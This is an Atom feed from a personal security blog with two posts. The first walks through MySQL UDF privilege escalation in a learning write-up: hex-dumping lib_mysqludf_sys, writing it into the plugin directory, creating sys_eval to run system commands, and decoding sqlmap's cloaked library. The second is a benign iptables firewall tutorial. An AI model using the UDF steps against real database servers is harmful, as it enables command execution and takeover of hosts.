<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Err0r</title>
  
  <subtitle>壮壮&#39; home</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://Err0rzz.github.io/"/>
  <updated>2018-01-28T07:10:47.192Z</updated>
  <id>http://Err0rzz.github.io/</id>
  
  <author>
    <name>Err0rzz</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>UDF--mysql</title>
    <link href="http://Err0rzz.github.io/2017/12/26/UDF-mysql/"/>
    <id>http://Err0rzz.github.io/2017/12/26/UDF-mysql/</id>
    <published>2017-12-26T07:48:13.000Z</published>
    <updated>2018-01-28T07:10:47.192Z</updated>
    
    <content type="html"><![CDATA[<p>emmm，虽然还是《白帽安全》这本书，但是前端那边的坑有机会再填吧，还是服务器端比较熟悉一点….</p><a id="more"></a><p>虽然这种在sqlmap里用过，但是一直不清楚咋实现的，看了书之后觉得还是记录一下学习过程吧。</p><p><strong>UDF(User-Defined Function,用户自定义函数)</strong><br>在流行的数据库中，一般都支持从本地文件系统中导入一个共享库文件作为自定义函数。使用如下语法可以创建UDF：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CREATE FUNCTION f_name RETURNS INTEGER SONAME shared_libray</div></pre></td></tr></table></figure></p><p>这里讲一下怎么安装<strong>lib_mysqludf.sys.so</strong>以及利用该.so文件来创建UDF从而执行sys_eval等system函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">函数：</div><div class="line"></div><div class="line">sys_eval，执行任意命令，并将输出返回。</div><div class="line"></div><div class="line">sys_exec，执行任意命令，并将退出码返回。</div><div class="line"></div><div class="line">sys_get，获取一个环境变量。</div><div class="line"></div><div class="line">sys_set，创建或修改一个环境变量。</div></pre></td></tr></table></figure></p><p><br><br><strong>攻击步骤</strong><br>攻击过程中，首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。然后，创建UDF。</p><p>lib_mysqludf_sys.dll的导出路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">MySQL&lt;5.0，导出路径随意；</div><div class="line"></div><div class="line">5.0 &lt;= MySQL&lt;5.1，则需要导出至目标服务器的系统目录（如：system32）</div><div class="line"></div><div class="line">MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</div></pre></td></tr></table></figure></p><p><br></p><h1 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h1><p>这里有三种方法，前<del>两</del>(一)种虽然都失败了，但是还是记录出来，万一以后成功了呢~<br><br><br><strong>方法一</strong></p><p>下载lib_mysqludf_sys程序：<a href="https://github.com/mysqludf/lib_mysqludf_sys" target="_blank" rel="external">https://github.com/mysqludf/lib_mysqludf_sys</a></p><p>解压后运行：sudo ./install.sh，然而在这里会报错<img src="https://i.imgur.com/VYUHIvA.png" alt=""></p><p>然而各种捣鼓各种百度也不行</p><p>除了运行.sh文件之外，也可以自己编译.so文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -DMYSQL_DYNAMIC_PLUGIN -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so</div></pre></td></tr></table></figure></p><p>但是还是说少个.h文件，百度说这是一个mysql的bug引起的错误，只要修改/usr/include/mysql/my_global.h文件，注释掉626行重新编译就可以了。(结果我连这个目录都没有)</p><p>先继续说下去吧，如果你上面都解决了，那么恭喜你，你快成功了。</p><p>接下来获得这个编译之后的.o文件的十六进制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select hex(load_file(&apos;/root/Desktop/lib_mysqludf_sys-master&apos;)) into outfile &quot;/tmp/hex.txt&quot;;</div></pre></td></tr></table></figure></p><p>然后看一下mysql的plugin目录在哪：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show variables like &apos;%plugin%&apos;;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/XdTTsCS.png" alt=""></p><p>再看一下有没有导过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from mysql.func;</div></pre></td></tr></table></figure></p><p>这里我就不截图了，因为我已经导过了，没有导过的话是空的。</p><p>紧接着将十六进制导入到plugin目录下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select hex(&apos;&apos;) into dumpfile &apos;/usr/lib/mysql/plugin/mysqludf.so&apos;;</div></pre></td></tr></table></figure></p><p>现在.o文件已经就位，最后一步就是用一开始说的那个创建UDF的函数来创建就好了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; create function sys_eval returns string soname &apos;mysqludf.so&apos;;</div></pre></td></tr></table></figure></p><p>再看看func里有什么：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from mysql.func;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/8Z3Zzz5.png" alt=""><br>可以看到多了个自定义的函数，接着耍耍权限吧：<br><img src="https://i.imgur.com/G4qzHt5.png" alt=""></p><p><br><br><strong>方法二</strong></p><p>和方法一差不多，不过利用的不是github上的源代码，而是sqlmap里自带的lib_mysqludf<em>sys.so</em>文件。</p><p>该文件在我本地的路径是<code>/usr/share/sqlmap/udf/linux/64/</code>，除此之外，udf目录下还有windows版本的文件。</p><p>但是测试的时候你又会惊喜的发现问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; create function sys_eval returns string soname &apos;udf.so&apos;;</div></pre></td></tr></table></figure></p><p>ERROR 1126 (HY000): Can’t open shared library ‘udf.so’ (errno: 22 /usr/lib64/mysql/plugin/udf.so: invalid ELF header)</p><p><del>如果解决了这个问题，那么恭喜你，而且请评论告诉一下我咋做，谢谢大佬们</del>~<br>这是因为sqlmap将此文件编码了一下，只需要用sqlmap/extra/clock/clock.py解锁一下就好了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cloak.py -d -i /usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so_</div></pre></td></tr></table></figure></p><p>会在.so_文件目录下生成.so文件：<br><img src="https://i.imgur.com/KFRMcbd.png" alt=""><br>该文件和方法一编译成功之后的文件是一样的，所以接下来十六进制什么操作都是一样的。</p><p><br><br><strong>方法三</strong></p><p>这个方法是最简单，最偷懒的。</p><p>因为反正最终目的是要将lib_mysqludf_sys.so编译一下，得到其十六进制数据，再重新写回到plugin目录下，方法一是出错在编译的时候，那我直接就不编译了，将别人编译好的十六进制数据拿来用呗(读书人的是叫借鉴)，接下来参照方法一。</p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>自动化注入工具sqlmap已经集成了此功能：<br><img src="https://i.imgur.com/WFjmKLc.png" alt=""></p><p>所以神器就是神器，还是要再研究一下sqlmap用法了。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;emmm，虽然还是《白帽安全》这本书，但是前端那边的坑有机会再填吧，还是服务器端比较熟悉一点….&lt;/p&gt;
    
    </summary>
    
    
      <category term="书籍学习" scheme="http://Err0rzz.github.io/tags/%E4%B9%A6%E7%B1%8D%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="注入" scheme="http://Err0rzz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="mysql提权" scheme="http://Err0rzz.github.io/tags/mysql%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>iptables的简单使用</title>
    <link href="http://Err0rzz.github.io/2017/12/21/iptables%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>http://Err0rzz.github.io/2017/12/21/iptables的简单使用/</id>
    <published>2017-12-21T02:06:31.000Z</published>
    <updated>2017-12-21T05:54:15.728Z</updated>
    
    <content type="html"><![CDATA[<p>作为出题人，考虑到学弟们不会肝通宵猝死，就需要关闭web题目。当时百度说用<code>iptables</code>结果华丽的失败了，最后还是潇洒的断网来拒绝服务。后来还是重新看了一下这个命令，发现还真是好用啊…</p><a id="more"></a><p>原理来自老师ppt，命令详解转自<a href="http://blog.chinaunix.net/uid-26495963-id-3279216.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-26495963-id-3279216.html</a><br><br></p><h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>先回顾一下防火墙的原理吧</p><ul><li>防火墙通过<strong>审查</strong>经过的每一个数据包，判断它是否有相<strong>匹配</strong>的<strong>过滤规则</strong>，根据规则的先后顺序进行<strong>一一比较</strong>，直到满足其中的一条规则为止，然后依据控制机制做出相应的动作。如果都不满足，则将数据包丢弃，从而保护网络的安全。</li><li>包过滤分为：静态包过滤、状态包过滤.</li><li>静态包过滤：在<strong>IP</strong>层只根据IP包的<code>源及目的地址，协议类型，端口号</code>进行过滤，安全性较差，不能应对现在复杂的网络应用</li></ul><p><br><br><code>iptables</code>相关概念：</p><ul><li>netfilter/iptabels是与Linux内核集成的包过滤防火墙系统，简称iptables。</li><li>几乎所有的linux发行版本都会包含iptables的功能，它可以代替昂贵的商业防火墙解决方案，<strong>完成封包过滤、封包重定向和网络地址转换NAT等</strong>功能。</li><li>在linux 内核中的模块被称为 netfilter。</li></ul><p><br><br><code>tables</code>相关概念：<br>iptables内置了filter，nat和mangle三张表,分别用于实现包过滤，网络地址转换和包重构的功能。</p><ul><li>filter负责过滤数据包，包括的规则链有input，output和forward。</li><li>nat则涉及到网络地址转换，包括的规则链有prerouting，postrouting和output；</li><li>mangle表则主要应用在修改数据包内容上，用来做流量整形的，默认的规则链有：INPUT，OUTPUT，NAT，POSTROUTING，PREROUTING</li><li>input匹配目的IP是本机的数据包。</li><li>output匹配源IP是本机的数据包。</li><li>forward匹配流经本机的数据包。</li><li>prerouting用来修改目的地址用来做DNAT。</li><li>postrouting用来修改源地址用来做SNAT。</li></ul><p><br><br><code>chains</code>相关概念：</p><ul><li>链（chains）是数据包<strong>传播的路径</strong>，每一条链其实就是众多规则中的一个<strong>检查清单</strong>，每一条链中可以有<strong>一条或数条</strong>规则。当一个数据包到达一个链时，iptables就会从链中<strong>第一条规则开始</strong>检查，看该数据包是否满足规则所定义的条件。</li><li>如果满足，系统就会根据该条规则所定义的方法处理该数据包；否则iptables将<strong>继续检查下一条</strong>规则，如果该数据包不符合链中任一条规则，iptables就会根据该链<strong>预先定义的默认策略</strong>来处理数据包。</li></ul><p><br><br><code>rules</code>相关概念：</p><ul><li>规则（rules）其实就是网络管理员预定义的<strong>条件</strong>，规则一般的定义为“<strong>如果数据包头符合这样的条件，就这样处理这个数据包</strong>”。规则存储在内核空间的信息包<strong>过滤表</strong>中，这些规则分别指定了<strong>源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）</strong>等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如<code>放行（accept）</code>、<code>拒绝（reject）</code>和<code>丢弃（drop）</code>等。</li><li>配置防火墙的主要工作就是<strong>添加、修改和删除</strong>这些规则。</li><li><strong>注意：规则的次序非常关键，谁的规则越严格，应该放的越靠前，而检查规则的时候，是按照从上往下的方式进行检查的。</strong><br><br></li></ul><p>iptables传输数据包的过程：<br><img src="https://i.imgur.com/waGZsEP.jpg" alt=""></p><ol><li>当一个数据包进入网卡时，它首先进入<strong>PREROUTING</strong>链，内核根据路由表和数据包目的IP判断是否需要<strong>转送</strong>出去。</li><li>如果数据包就是<strong>进入本机</strong>的，它就会沿着图向下移动，到达<strong>INPUT</strong>链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过<strong>OUTPUT</strong>链，然后到达POSTROUTING链输出。</li><li>如果数据包是要<strong>转发</strong>出去的，且内核允许转发，数据包就会如图所示向右移动，经过<strong>FORWARD</strong>链，然后到达<strong>POSTROUTING</strong>链输出。<br><br></li></ol><h1 id="iptables操作"><a href="#iptables操作" class="headerlink" title="iptables操作"></a>iptables操作</h1><h2 id="规则写法："><a href="#规则写法：" class="headerlink" title="规则写法："></a>规则写法：</h2><p>格式：iptables [-t table] COMMAND chain CRETIRIA -j ACTION</p><ul><li>-t table ：3个filter nat mangle，默认是filter</li><li>COMMAND：定义如何对规则进行管理</li><li>chain：指定你接下来的规则到底是在哪个链上操作的，当定义策略的时候，是可以省略的</li><li>CRETIRIA:指定匹配标准</li><li>-j ACTION :指定如何进行处理</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">比如：不允许172.16.0.0/24的进行访问。</div><div class="line">iptables -t filter -A INPUT -s 172.16.0.0/16 -p udp --dport 53 -j DROP</div><div class="line">当然你如果想拒绝的更彻底：</div><div class="line">iptables -t filter -R INPUT 1 -s 172.16.0.0/16 -p udp --dport 53 -j REJECT</div><div class="line">查看定义规则的详细信息:</div><div class="line">iptables -L -n -v</div></pre></td></tr></table></figure><p><br></p><h2 id="COMMAND详解："><a href="#COMMAND详解：" class="headerlink" title="COMMAND详解："></a>COMMAND详解：</h2><h3 id="chains管理："><a href="#chains管理：" class="headerlink" title="chains管理："></a>chains管理：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">-P :设置默认策略的，默认策略一般只有两种</div><div class="line">iptables -P INPUT (DROP|ACCEPT)  默认是关的/默认是开的</div><div class="line">比如：</div><div class="line">iptables -P INPUT DROP 这就把默认规则给拒绝了。并且没有定义哪个动作，所以关于外界连接的所有规则包括Xshell连接之类的，远程连接都被拒绝了。</div><div class="line"></div><div class="line">-F: FLASH，</div><div class="line">清空规则链的(注意每个链的管理权限)</div><div class="line">iptables -t nat -F PREROUTING</div><div class="line">iptables -t nat -F 清空nat表的所有链</div><div class="line">        </div><div class="line">-N:NEW 支持用户新建一个链</div><div class="line">iptables -N inbound_tcp_web 表示附在tcp表上用于检查web的。</div><div class="line">   </div><div class="line">-X: 用于删除用户自定义的空链</div><div class="line">使用方法跟-N相同，但是在删除之前必须要将里面的链给清空昂了</div><div class="line">     </div><div class="line">-E：用来Rename chain主要是用来给用户自定义的链重命名</div><div class="line">       </div><div class="line">-Z：清空链，及链中默认规则的计数器的（有两个计数器，被匹配到多少个数据包，多少个字节）</div></pre></td></tr></table></figure><p><br></p><h3 id="rules管理："><a href="#rules管理：" class="headerlink" title="rules管理："></a>rules管理：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-A：追加规则</div><div class="line">         </div><div class="line">-I num : 插入规则。比如说：-I 3 表示插入为第三条</div><div class="line">         </div><div class="line">-R num：替换/修改第几条规则</div><div class="line">         </div><div class="line">-D num：删除第几条规则</div></pre></td></tr></table></figure><p><br></p><h3 id="查看管理："><a href="#查看管理：" class="headerlink" title="查看管理："></a>查看管理：</h3><p>参数是<code>-L</code>，子命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">-n：</div><div class="line">以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。</div><div class="line"> </div><div class="line">-v：显示详细信息</div><div class="line"> </div><div class="line">-vv</div><div class="line"> </div><div class="line">-vvv :越多越详细</div><div class="line"> </div><div class="line">-x：在计数器上显示精确值</div><div class="line"> </div><div class="line">--line-numbers : 显示规则的行号</div><div class="line"> </div><div class="line">-t nat：显示所有的关卡的信息</div></pre></td></tr></table></figure></p><p><br></p><h2 id="CRETIRIA详解："><a href="#CRETIRIA详解：" class="headerlink" title="CRETIRIA详解："></a>CRETIRIA详解：</h2><h3 id="地址匹配："><a href="#地址匹配：" class="headerlink" title="地址匹配："></a>地址匹配：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-s：指定作为源地址匹配，这里不能指定主机名称，必须是IP</div><div class="line">IP | IP/MASK | 0.0.0.0/0.0.0.0</div><div class="line">而且地址可以取反，加一个“!”表示除了哪个IP之外</div><div class="line"> </div><div class="line">-d：表示匹配目标地址，使用同-s</div><div class="line"></div><div class="line">-p：用于匹配协议的（这里的协议通常有3种，TCP/UDP/ICMP）</div><div class="line"> </div><div class="line">-i eth0：从这块网卡流入的数据，流入一般用在INPUT和PREROUTING上</div><div class="line"></div><div class="line">-o eth0：从这块网卡流出的数据，流出一般在OUTPUT和POSTROUTING上</div></pre></td></tr></table></figure><p><br></p><h3 id="协议扩展："><a href="#协议扩展：" class="headerlink" title="协议扩展："></a>协议扩展：</h3><ul><li>-p tcp :TCP协议的扩展。一般有三种扩展<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">--dport XX-XX：指定目标端口,不能指定多个非连续端口,只能指定单个端口，比如:--dport 21  或者 --dport 21-23 (此时表示21,22,23)</div><div class="line">--sport：指定源端口</div><div class="line">--tcp-fiags：TCP的标志位（SYN,ACK，FIN,PSH，RST,URG）</div><div class="line">    对于它，一般要跟两个参数：</div><div class="line">1.检查的标志位</div><div class="line">2.必须为1的标志位</div><div class="line">--tcp-flags syn,ack,fin,rst syn   =    --syn</div><div class="line">表示检查这4个位，这4个位中syn必须为1，其他的必须为0。所以这个意思就是用于检测三次握手的第一次包的。对于这种专门匹配第一包的SYN为1的包，还有一种简写方式，叫做--syn</div></pre></td></tr></table></figure></li></ul><ul><li>-p udp：UDP协议的扩展<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">--dport</div><div class="line">--sport</div></pre></td></tr></table></figure></li></ul><ul><li>-p icmp：icmp数据报文的扩展<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">--icmp-type：</div><div class="line">echo-request(请求回显)，一般用8 来表示</div><div class="line">所以 --icmp-type 8 匹配请求回显数据包</div><div class="line">echo-reply （响应的数据包）一般用0来表示</div></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="显式扩展-m"><a href="#显式扩展-m" class="headerlink" title="显式扩展(-m)"></a>显式扩展(-m)</h3><p>扩展各种模块</p><ul><li><p>-m multiport:表示启用多端口扩展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">打开21，23,80这三个不连续端口</div><div class="line">-m multiport --dports 21,23,80</div></pre></td></tr></table></figure></li><li><p>-m mac –mac-source:表示mac源地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">源mac地址为00:0c:29:27:55:3F</div><div class="line">-m mac --mac-source 00:0c:29:27:55:3F</div></pre></td></tr></table></figure></li><li><p>-m –iprange –src-range:表示源IP范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">源IP地址为192.168.1.20-192.168.1.99</div><div class="line">-m iprange --src-range 192.168.1.20-192.168.1.99</div></pre></td></tr></table></figure></li><li><p>-m state –state：表示数据包连接状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">新的数据包</div><div class="line">-m state --state NEW</div></pre></td></tr></table></figure></li></ul><p><br></p><h2 id="ACTION详解："><a href="#ACTION详解：" class="headerlink" title="ACTION详解："></a>ACTION详解：</h2><p>常用的ACTION：</p><ul><li>DROP：悄悄丢弃，一般我们多用DROP来隐藏我们的身份，以及隐藏我们的链表</li><li>REJECT：明示拒绝</li><li>ACCEPT：接受</li><li>custom_chain：转向一个自定义的链</li><li>MASQUERADE：源地址伪装</li><li>REDIRECT：重定向：主要用于实现端口重定向</li><li>MARK：打防火墙标记的</li><li>RETURN：返回，在自定义链执行完毕后使用返回，来返回原规则链<br><br></li></ul><h1 id="记录一下常见的命令："><a href="#记录一下常见的命令：" class="headerlink" title="记录一下常见的命令："></a>记录一下常见的命令：</h1><ul><li><strong>只要是来自于172.16.0.0/16网段的都允许访问我本机的172.16.100.1的SSHD服务</strong><br>分析：首先肯定是在允许表中定义的。因为不需要做NAT地址转换之类的，然后查看我们SSHD服务，在22号端口上，处理机制是接受，对于这个表，需要有一来一回两个规则，如果我们允许也好，拒绝也好，对于访问本机服务，我们最好是定义在INPUT链上，而OUTPUT再予以定义就好。(会话的初始端先定义)，所以加规则就是：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">定义进来的： iptables -t filter -A INPUT -s 172.16.0.0/16 -d 172.16.100.1 -p tcp --dport 22 -j ACCEPT</div><div class="line">定义出去的： iptables -t filter -A OUTPUT -s 172.16.100.1 -d 172.16.0.0/16 -p tcp --dport 22 -j ACCEPT</div><div class="line">将默认策略改成DROP:</div><div class="line">iptables -P INPUT DROP</div><div class="line">iptables -P OUTPUT DROP</div><div class="line">iptables -P FORWARD DROP</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>假如我们允许自己ping别人，但是别人ping自己ping不通如何实现呢？</strong><br>分析：对于ping这个协议，进来的为8（ping），出去的为0(响应).我们为了达到目的，需要8出去,允许0进来，也就相当于我们要求我们只发送请求包，接收响应包(符合ping别人的要求，不符合别人ping自己的要求)<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在出去的端口上：iptables -A OUTPUT -p icmp --icmp-type 8 -j ACCEPT</div><div class="line">在进来的端口上：iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p>结果如下：<br>没设规则之前，双方都能ping通<br><img src="https://i.imgur.com/ala3qws.png" alt=""><br><img src="https://i.imgur.com/4s6hrIn.png" alt=""><br>设了规则<br><img src="https://i.imgur.com/qcS5mBH.png" alt=""><br>此时只能ping别人，别人ping不到了<br><img src="https://i.imgur.com/YQntQJ1.png" alt=""><br><img src="https://i.imgur.com/eDFSTfF.png" alt=""><br><br></p><ul><li><strong>拒绝进入防火墙的所有ICMP协议数据包</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -I INPUT -p icmp -j REJECT</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>允许防火墙转发出ICMP协议外所有数据包</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -p !icmp -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -s 192.168.1.11 -j REJECT </div><div class="line">iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p>说明：注意要把拒绝的放在前面不然就不起作用了啊。<br><br></p><ul><li><strong>封堵网段(192.168.1.0/24)，两小时后解封</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># iptables -I INPUT -s 192.168.1.0/24 -j DROP </div><div class="line"># iptables -I FORWARD -s 192.168.1.0/24 -j DROP </div><div class="line"># at now 2 hours at&gt; iptables -D INPUT 1 at&gt; iptables -D FORWARD 1</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>只允许管理员从202.13.0.0/16网段使用SSH远程登录防火墙主机。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT</div><div class="line">iptables -A INPUT -p tcp --dport 22 -j DROP</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>允许本机开放从TCP端口20-1024提供的应用服务。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPT</div><div class="line">iptables -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>允许转发来自192.168.0.0/24局域网段的DNS解析请求数据包。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT </div><div class="line">iptables -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>禁止转发来自MAC地址为00：0C：29：27：55：3F的和主机的数据包</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3F -j DROP</div></pre></td></tr></table></figure></li></ul><p>说明：iptables中使用“-m 模块关键字”的形式调用显示匹配。咱们这里用“-m mac –mac-source”来表示数据包的源MAC地址。<br><br></p><ul><li><strong>允许防火墙本机对外开放TCP端口20、21、25、110以及被动模式FTP端口1250-1280</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p>说明：这里用“-m multiport –dport”来指定目的端口及范围<br><br></p><ul><li><strong>禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP</div></pre></td></tr></table></figure></li></ul><p>说明：此处用“-m –iprange –src-range”指定IP范围。<br><br></p><ul><li><strong>禁止转发与正常TCP连接无关的非—syn请求数据包。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -p tcp -m state --state NEW ! --syn -j DROP</div></pre></td></tr></table></figure></li></ul><p>说明：“-m state”表示数据包的连接状态，“NEW”表示与任何连接无关的，新的嘛！<br><br></p><ul><li><strong>拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp -m state --state NEW -j DROP</div><div class="line">iptalbes -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p>说明：“ESTABLISHED”表示已经响应请求或者已经建立连接的数据包，“RELATED”表示与已建立的连接有相关性的，比如FTP数据连接等。<br><br></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作为出题人，考虑到学弟们不会肝通宵猝死，就需要关闭web题目。当时百度说用&lt;code&gt;iptables&lt;/code&gt;结果华丽的失败了，最后还是潇洒的断网来拒绝服务。后来还是重新看了一下这个命令，发现还真是好用啊…&lt;/p&gt;
    
    </summary>
    
    
      <category term="运维" scheme="http://Err0rzz.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
